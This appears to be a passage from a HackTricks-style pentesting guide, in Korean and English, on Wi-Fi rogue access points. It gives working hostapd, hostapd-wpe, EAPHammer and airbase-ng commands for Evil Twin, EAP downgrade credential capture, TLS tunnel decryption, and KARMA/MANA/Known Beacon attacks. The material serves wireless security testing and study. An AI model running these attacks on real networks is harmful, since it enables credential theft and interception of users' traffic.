- Passive scanning 동안 Stations는 beacon frames를 수신합니다. 만약 beacon의 ESSID가 station의 PNL 항목과 일치하면, station은 해당 AP에 자동으로 연결할 수 있습니다.
- 장치의 PNL을 알면 알려진 네트워크의 ESSID를 모방하여 장치를 rogue AP에 연결되도록 속이는 등 잠재적 악용이 가능합니다.

### Active Probing

- Active probing은 Stations가 probe requests를 전송하여 주변 APs와 그 특성을 발견하는 행위입니다.
- Directed probe requests는 특정 ESSID를 대상으로 하여, 숨겨진 네트워크인 경우에도 해당 네트워크가 범위 내에 있는지 감지하는 데 도움을 줍니다.
- Broadcast probe requests는 null SSID 필드를 가지며 주변의 모든 APs로 전송되어, station이 PNL 내용을 드러내지 않고도 선호 네트워크가 있는지 확인할 수 있게 합니다.

## 인터넷으로 리디렉션되는 간단한 AP

더 복잡한 공격을 설명하기 전에, 단순히 **AP**를 **생성**하고 그 **트래픽**을 **인터넷**에 연결된 인터페이스로 **리디렉션**하는 방법을 먼저 설명합니다.

Using `ifconfig -a`를 사용하여 AP를 생성할 wlan 인터페이스와 인터넷에 연결된 인터페이스가 존재하는지 확인하세요.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
구성 파일 `/etc/dnsmasq.conf`을 생성하세요:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
그런 다음 **set IPs** 및 **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
그리고 dnsmasq를 **시작**합니다:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
구성 파일 `hostapd.conf` 생성:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**성가신 프로세스를 중지**하고, **monitor mode**를 설정하고, **hostapd를 시작**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### 포워딩 및 리다이렉션
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Evil Twin 공격은 WiFi 클라이언트가 네트워크를 인식하는 방식을 악용합니다. 클라이언트는 주로 네트워크 이름(ESSID)에 의존하며, base station (access point)이 클라이언트에게 자신을 인증할 필요가 없습니다. 주요 내용은 다음과 같습니다:

- **Difficulty in Differentiation**: 장치들은 동일한 ESSID와 암호화 유형을 공유할 때 합법적인 access point와 rogue access point를 구분하기 어렵습니다. 실제 환경에서는 커버리지를 매끄럽게 확장하기 위해 동일한 ESSID를 가진 여러 access point를 사용하는 경우가 많습니다.
- **Client Roaming and Connection Manipulation**: 802.11 프로토콜은 동일한 ESS 내에서 장치가 access points 간에 로밍하도록 허용합니다. 공격자는 장치를 현재 base station에서 분리시키고 rogue access point에 연결하도록 유도함으로써 이를 악용할 수 있습니다. 이는 더 강한 신호를 제공하거나 deauthentication packets나 jamming 같은 방법으로 합법적인 access point와의 연결을 방해함으로써 이루어질 수 있습니다.
- **Challenges in Execution**: 여러 개의 잘 배치된 access points가 있는 환경에서 evil twin 공격을 성공적으로 실행하는 것은 어려울 수 있습니다. 단일 합법적인 access point를 deauthenticate하면, 공격자가 주변의 모든 access points를 deauthenticate하거나 전략적으로 rogue access point를 배치하지 않는 한 장치는 종종 다른 합법적인 access point에 연결하게 됩니다.

You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
또한 **eaphammer**를 사용하여 Evil Twin을 생성할 수 있습니다 (참고: eaphammer로 evil twins를 생성하려면 interface가 **monitor** 모드에 **있어서는 안 됩니다**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
또는 Airgeddon을 사용: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

기본적으로 PNL에 있는 ESSID가 WPA로 보호되어 저장되어 있으면, 기기는 자동으로 Open evil Twin에 연결하지 않습니다. 실제 AP를 DoS하여 사용자가 수동으로 당신의 Open evil Twin에 연결하기를 기대할 수 있고, 또는 실제 AP를 DoS하고 WPA Evil Twin을 사용해 handshake를 캡처할 수 있습니다(이 방법을 사용할 경우 PSK를 모르기 때문에 피해자가 당신에게 연결하도록 허용할 수는 없지만, handshake를 캡처해서 크랙을 시도할 수 있습니다).

_Some OS and AV will warn the user that connect to an Open network is dangerous..._

### WPA/WPA2 Evil Twin

당신은 **Evil Twin using WPA/2**를 생성할 수 있으며, 기기들이 해당 SSID에 WPA/2로 연결하도록 구성되어 있다면 연결을 시도할 것입니다. 어쨌든, **to complete the 4-way-handshake**하려면 클라이언트가 사용할 **비밀번호**를 **알고** 있어야 합니다. 만약 **모른다면**, **연결은 완료되지 않습니다**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

이 공격을 이해하려면 먼저 간단한 [WPA Enterprise explanation](#wpa-enterprise-mgt)를 읽어보시길 권합니다.

**hostapd-wpe 사용하기**

`hostapd-wpe`는 작동하기 위해 **구성** 파일이 필요합니다. 이러한 구성 파일 생성을 **자동화**하려면 [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad)를 사용할 수 있습니다 ( _/etc/hostapd-wpe/_ 안의 python 파일을 다운로드하세요).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
구성 파일에서 ssid, channel, user files, cret/key, dh parameters, wpa version 및 auth 등 다양한 항목을 선택할 수 있습니다...

[**hostapd-wpe를 EAP-TLS와 함께 사용하여 어떤 certificate로도 로그인할 수 있도록 허용하기.**](evil-twin-eap-tls.md)

**EAPHammer 사용**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
기본적으로 EAPHammer는 다음 인증 방법을 사용합니다(주의: GTC가 먼저 plaintext passwords를 얻기 위해 시도되며, 그 다음 더 강력한 auth methods를 사용합니다):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
이것은 긴 연결 시간을 피하기 위한 기본 방법론입니다. 그러나 authentication methods를 가장 약한 것에서 가장 강한 것으로 server에 지정할 수도 있습니다:
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Using Airgeddon**

`Airgeddon`은 이전에 생성된 인증서를 사용하여 WPA/WPA2-Enterprise 네트워크에 EAP 인증을 제공할 수 있습니다. 이 가짜 네트워크는 연결 프로토콜을 EAP-MD5로 다운그레이드하여 **사용자와 비밀번호의 MD5를 캡처**할 수 있습니다. 이후 공격자는 비밀번호를 크랙하려 시도할 수 있습니다.\
`Airggedon`은 **지속적인 Evil Twin attack (noisy)** 또는 **누군가 연결할 때까지만 Evil Attack을 생성하는 (smooth)** 옵션을 제공합니다.

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

_inside the **configuration** of _hostapd-wpe_ **comment** the line that contains _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)_\
이렇게 하면 `hostapd-wpe`가 DH 대신 **RSA를 사용해 키를 교환**하므로, 나중에 서버의 private key를 알고 있으면 트래픽을 **decrypt**할 수 있습니다.

이제 수정한 구성으로 평소처럼 **`hostapd-wpe`**를 사용하여 **Evil Twin**을 시작하세요. 또한 Evil Twin 공격을 수행하는 **interface**에서 **`wireshark`**를 실행하세요.

지금 또는 추후(이미 일부 authentication intents를 캡처한 경우) 다음에서 개인 RSA 키를 wireshark에 추가할 수 있습니다: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

새 항목을 추가하고 다음 값으로 양식을 채우세요: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**키 파일을 선택하세요**, 문제를 피하려면 **비밀번호로 보호되어 있지 않은** 키 파일을 선택하세요).

![](<../../images/image (687).png>)

그리고 새 **"Decrypted TLS" tab**을 확인하세요:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Different types of Media Access Control Filter Lists (MFACLs) and their corresponding modes and effects on the behavior of a rogue Access Point (AP):

1. **MAC-based Whitelist**:
- rogue AP는 whitelist에 지정된 장치의 probe requests에만 응답하며, 목록에 없는 다른 모든 장치에는 보이지 않습니다.
2. **MAC-based Blacklist**:
- rogue AP는 blacklist에 있는 장치의 probe requests를 무시하여, 해당 특정 장치들에 대해 사실상 보이지 않게 됩니다.
3. **SSID-based Whitelist**:
- rogue AP는 목록에 있는 특정 ESSIDs에 대해서만 probe requests에 응답하며, 해당 ESSID가 Preferred Network Lists (PNLs)에 없는 장치에는 보이지 않게 됩니다.
4. **SSID-based Blacklist**:
- rogue AP는 blacklist에 있는 특정 ESSID에 대한 probe requests에 응답하지 않아, 해당 네트워크를 찾는 장치에는 보이지 않게 됩니다.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

이 방법은 **공격자가 모든 probe requests에 응답하는 악성 access point (AP)를 생성할 수 있게 한다**. 이 기법은 장치들이 찾고 있는 네트워크를 흉내 내어 **장치들을 공격자의 AP에 연결되도록 속인다**. 장치가 이 rogue AP에 connection request를 보내면 연결이 완료되어 장치는 실수로 공격자의 네트워크에 연결된다.

### MANA

그 이후 **장치들이 신뢰할 수 없는 네트워크 응답을 무시하기 시작하면서**, 원래의 karma attack의 효과는 감소했다. 그러나 Ian de Villiers와 Dominic White가 소개한 새로운 방법인 **MANA attack**이 등장했다. 이 방법은 rogue AP가 **broadcast probe requests에 응답하여 장치들로부터 Preferred Network Lists (PNL)을 캡처하는 것**으로, 장치들이 이전에 신뢰한 네트워크 이름(SSIDs)으로 응답해 PNL을 수집한다. 이 정교한 공격은 장치들이 알려진 네트워크를 기억하고 우선순위를 매기는 방식을 악용하여 원래의 karma attack에 대한 방어를 우회한다.

MANA attack은 장치들의 directed 및 broadcast probe requests를 모두 모니터링하면서 동작한다. directed 요청에 대해서는 장치의 MAC address와 요청된 네트워크 이름을 기록해 목록에 추가한다. broadcast 요청이 수신되면 AP는 장치 목록에 있는 네트워크와 일치하는 정보를 응답하여 장치를 rogue AP에 연결되도록 유도한다.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack**는 장치들이 지향형 probing을 사용하지 않거나 공격자가 Preferred Network Lists (PNL)을 알지 못할 때 사용하는 고급 전략이다. 이 방법은 **같은 지역에 있는 장치들은 PNL에 일부 네트워크 이름을 공유할 가능성이 높다**는 원리에 기반한다. 선택적으로 응답하는 대신, 이 공격은 관찰된 모든 장치의 합쳐진 PNL에서 발견된 모든 네트워크 이름(ESSID)에 대해 프로브 응답을 방송한다. 이 광범위한 방식은 장치가 익숙한 네트워크를 인식하고 악성 Access Point (AP)에 연결을 시도할 가능성을 높인다.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

**Loud MANA attack**가 충분하지 않을 때, **Known Beacon attack**은 또 다른 접근법을 제시한다. 이 방법은 **wordlist에서 파생된 가능한 ESSIDs 목록을 순환하며 모든 네트워크 이름에 응답하는 AP를 시뮬레이션함으로써 연결 과정을 brute-forces한다**. 이렇게 하면 수많은 네트워크가 존재하는 것처럼 시뮬레이션되어 피해자의 PNL에 있는 ESSID와 일치하길 기대하며, 일치할 경우 조작된 AP로의 연결 시도를 유도한다. 장치 포획을 보다 공격적으로 시도하려면 `--loud` 옵션과 결합해 공격을 강화할 수 있다.

Eaphammer는 이 공격을 목록 안의 모든 ESSIDs를 방송하는 MANA 공격으로 구현했다 (또한 `--loud`와 결합하여 Loud MANA + Known beacons attack을 만들 수도 있다):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

The **Known Beacon Burst attack** involves **파일에 나열된 각 ESSID에 대해 beacon frames를 연속적으로 브로드캐스트하는** 방식입니다. 이는 가짜 네트워크가 밀집한 환경을 조성하여 장치들이 rogue AP에 연결할 가능성을 크게 높이며, 특히 MANA attack과 결합될 때 효과적입니다. 이 기술은 속도와 대량을 이용해 장치들의 네트워크 선택 메커니즘을 압도합니다.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct**는 전통적인 무선 액세스 포인트 없이 Wi-Fi를 통해 기기들이 서로 직접 연결할 수 있게 해주는 프로토콜입니다. 이 기능은 프린터나 텔레비전과 같은 다양한 Internet of Things (IoT) 기기에 통합되어 장치 간 직접 통신을 가능하게 합니다. Wi-Fi Direct의 중요한 특징 중 하나는 연결을 관리하기 위해 한 기기가 access point 역할을 하며, 이를 group owner라고 부른다는 점입니다.

Security for Wi-Fi Direct connections is established through **Wi-Fi Protected Setup (WPS)**, which supports several methods for secure pairing, including:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

이들 방법, 특히 PIN entry는 전통적인 Wi-Fi 네트워크의 WPS가 가진 취약점과 동일한 취약성에 노출되기 쉬우며, 따라서 유사한 공격 벡터의 대상이 됩니다.

### EvilDirect Hijacking

**EvilDirect Hijacking**은 Wi-Fi Direct에 특화된 공격입니다. 이는 Evil Twin 공격의 개념을 그대로 Wi-Fi Direct에 적용한 것으로, 공격자가 합법적인 group owner를 가장해 장치들이 악성 엔티티에 연결되도록 속이는 것을 목표로 합니다. 이 방법은 `airbase-ng`와 같은 도구를 사용해 채널, ESSID, MAC 주소를 지정함으로써 실행할 수 있습니다:

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: Take a look to [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login con facebook e imitacionde WPA en captive portals)

{{#include ../../banners/hacktricks-training.md}}
